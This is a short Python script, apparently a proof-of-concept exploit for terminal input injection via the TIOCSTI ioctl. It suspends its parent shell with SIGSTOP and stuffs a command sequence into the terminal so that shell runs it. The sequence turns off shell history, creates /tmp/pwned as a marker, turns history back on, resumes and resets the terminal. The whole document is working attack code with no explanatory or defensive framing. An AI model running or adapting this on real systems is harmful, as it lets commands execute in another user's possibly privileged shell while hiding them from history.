#!/usr/bin/env python3

import fcntl
import termios
import os
import signal

cmd = ' set +o history\n touch /tmp/pwned\n set -o history\n fg\n reset\n'

os.kill(os.getppid(), signal.SIGSTOP)

for char in cmd:
    fcntl.ioctl(0, termios.TIOCSTI, char)
